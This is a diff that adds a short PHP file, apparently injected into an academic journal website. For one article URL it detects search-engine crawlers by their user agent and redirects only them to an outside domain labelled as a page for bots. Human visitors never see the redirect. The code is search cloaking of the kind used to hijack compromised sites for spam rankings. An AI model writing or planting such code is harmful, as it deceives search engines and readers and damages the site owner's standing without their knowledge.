@@ -1,0 +1,16 @@
+<?php
+if (strpos($_SERVER['REQUEST_URI'], '/redec/article/view/9') !== false) {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $bots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot'];
+    $isBot = false;
+    foreach ($bots as $bot) {
+        if (stripos($ua, $bot) !== false) {
+            $isBot = true;
+            break;
+        }
+    }
+    if ($isBot) {
+        header('Location: https://conten-bot-anda.com/halaman-untuk-bot');
+        exit;
+    }
+}
